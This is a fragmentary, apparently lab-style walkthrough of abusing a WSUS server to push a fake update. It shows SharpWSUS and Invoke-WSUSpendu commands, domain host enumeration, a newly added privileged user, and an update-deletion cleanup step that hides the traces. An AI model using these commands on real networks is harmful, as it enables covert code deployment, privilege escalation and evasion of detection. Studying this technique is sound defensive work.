...
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    http://wsus.DOMAIN.local:8530
```
...
WSUS Server: http://wsus.DOMAIN.local:8530
[*] Locate complete
```
...
---------------------------------------------------
sccm.DOMAIN.local, 172.20.0.25, 10.0.17763.2510, 6/26/2024 12:14:15 PM
dc01.DOMAIN.local, 172.20.0.10, 10.0.17763.2510
srv01.DOMAIN.local, 172.20.0.51, 10.0.17763.2510
...
Targeting srv01.DOMAIN.local
TargetComputer, ComputerID, TargetID
------------------------------------
srv01.DOMAIN.local, bbc6e1ed-75ec-4eea-81cf-05da5c18e93e, 3
...
DOMAIN\Filiplain         <-- ¡NUEVO!
DOMAIN\PDQ Deploy Admin
...
```powershell
.\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 /computername:srv01.DOMAIN.local /groupname:"FastUpdates"
```
...
Invoke-WSUSpendu -UpdateTitle "MaliciousUpdate" -UpdateDescription "Legit patch" -ComputerTargets "srv01.DOMAIN.local"
```
